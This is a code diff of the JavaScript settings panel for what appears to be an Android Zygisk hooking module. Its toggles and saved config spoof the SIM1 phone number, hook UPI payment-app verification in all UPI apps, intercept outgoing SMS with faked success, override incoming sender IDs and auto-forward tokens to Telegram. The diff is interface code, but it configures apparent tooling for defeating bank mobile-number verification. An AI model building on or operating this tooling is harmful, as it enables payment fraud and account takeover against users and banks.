@@ -16,23 +16,43 @@
     }
   }
 
-  function load() {
-    const b = bridge();
-    cfg = b ? parseCfg(b.readConfig()) : {};
-    applyToForm();
-    paintStatus();
+  function syncBodies() {
+    const map = [
+      ["swFake", "bodyFake"],
+      ["swPrefix", "bodyPrefix"],
+      ["swSender", "bodySender"],
+      ["swTg", "bodyTg"],
+    ];
+    map.forEach(([sw, body]) => {
+      const s = $("#" + sw);
+      const b = $("#" + body);
+      if (!s || !b) return;
+      b.classList.toggle("open", !!s.checked);
+    });
   }
 
   function applyToForm() {
     $$("[data-key]").forEach((el) => {
       const k = el.dataset.key;
-      const v = cfg[k];
+      let v = cfg[k];
+      // SMSTweaks aliases
+      if (k === "enable_sim1_mock" && cfg.fake_number_enabled != null) {
+        v = cfg.fake_number_enabled || v;
+      }
+      if (k === "intercept_fake_success" && cfg.intercept_enabled != null) {
+        v = cfg.intercept_enabled || v;
+      }
+      if (k === "auto_forward_token" && cfg.telegram_enabled != null) {
+        v = cfg.telegram_enabled || v;
+      }
       if (el.type === "checkbox") {
         el.checked = v === true || v === "true";
       } else {
         el.value = v == null ? "" : String(v);
       }
     });
+    syncBodies();
+    paintStatus();
   }
 
   function collect() {
@@ -42,14 +62,50 @@
       if (el.type === "checkbox") out[k] = el.checked;
       else out[k] = el.value.trim();
     });
-    if (out.enable_sim1_mock || (out.mock_phone_sim1 && out.mock_phone_sim1.length === 10)) {
-      out.enable_virtual_sim = true;
-      out.enable_phone_spoof = true;
-    }
+
+    // Mirror SMSTweaks keys + Virtus keys
+    out.fake_number_enabled = !!out.enable_sim1_mock;
+    out.enable_phone_spoof = !!out.enable_sim1_mock;
+    out.enable_virtual_sim = !!out.enable_sim1_mock && !!(out.mock_phone_sim1 && String(out.mock_phone_sim1).length >= 10);
+    out.intercept_enabled = !!out.intercept_fake_success;
+    out.telegram_enabled = !!out.auto_forward_token;
+    out.fake_intercept_telegram = !!out.auto_forward_token;
+    out.hook_outgoing_sms = out.hook_outgoing_sms !== false;
     out.hook_upi_verification = true;
     out.hook_all_upi_apps = true;
     out.auto_hook_foreground = true;
+    out.sender_id_enabled = !!out.override_incoming_sender;
+
+    if (out.inject_sender_id === "AD-TEST-S") out.inject_sender_id = "";
     return out;
+  }
+
+  function paintStatus(note) {
+    const el = $("#statusLine");
+    if (!el) return;
+    if (note === "saved") {
+      el.textContent = "settings saved";
+      el.style.color = "var(--green)";
+      return;
+    }
+    const intercept = cfg.intercept_fake_success === true || cfg.intercept_enabled === true;
+    const fake = cfg.enable_sim1_mock === true || cfg.fake_number_enabled === true;
+    if (intercept && fake) {
+      el.textContent = "intercept + spoof ready";
+      el.style.color = "var(--green)";
+    } else if (intercept) {
+      el.textContent = "intercept on · set fake number";
+      el.style.color = "#e8b84a";
+    } else {
+      el.textContent = "Zygisk Mode · tap Save";
+      el.style.color = "var(--muted)";
+    }
+  }
+
+  function load() {
+    const b = bridge();
+    cfg = b ? parseCfg(b.readConfig()) : {};
+    applyToForm();
   }
 
   function save() {
@@ -58,27 +114,15 @@
     if (b) b.saveConfig(JSON.stringify(next));
     cfg = next;
     paintStatus("saved");
-  }
-
-  function paintStatus(note) {
-    const el = $("#statusLine");
-    if (!el) return;
-    const intercept = cfg.intercept_fake_success === true || cfg.intercept_fake_success === "true";
-    const mock = cfg.mock_phone_sim1 && String(cfg.mock_phone_sim1).length === 10;
-    if (note === "saved") {
-      el.textContent = "config saved";
-      el.style.color = "var(--ok)";
-      return;
-    }
-    if (intercept && mock) {
-      el.textContent = "intercept ready";
-      el.style.color = "var(--ok)";
-    } else if (intercept) {
-      el.textContent = "intercept on · set mock number";
-      el.style.color = "var(--warn)";
-    } else {
-      el.textContent = "partial setup";
-      el.style.color = "var(--muted)";
+    const btn = $("#btnSave");
+    if (btn) {
+      btn.classList.add("saved");
+      btn.textContent = "Saved ✓";
+      setTimeout(() => {
+        btn.classList.remove("saved");
+        btn.textContent = "Save Settings";
+        paintStatus();
+      }, 1400);
     }
   }
 
@@ -87,8 +131,7 @@
       $$(".tab").forEach((t) => t.classList.remove("active"));
       $$(".panel").forEach((p) => p.classList.remove("active"));
       tab.classList.add("active");
-      const id = "panel-" + tab.dataset.tab;
-      const panel = document.getElementById(id);
+      const panel = document.getElementById("panel-" + tab.dataset.tab);
       if (panel) panel.classList.add("active");
     });
   });
@@ -101,7 +144,14 @@
   $$("input").forEach((el) => {
     el.addEventListener("change", () => {
       cfg = collect();
+      syncBodies();
       paintStatus();
+    });
+    el.addEventListener("input", () => {
+      if (el.type !== "checkbox") {
+        cfg = collect();
+        paintStatus();
+      }
     });
   });
 
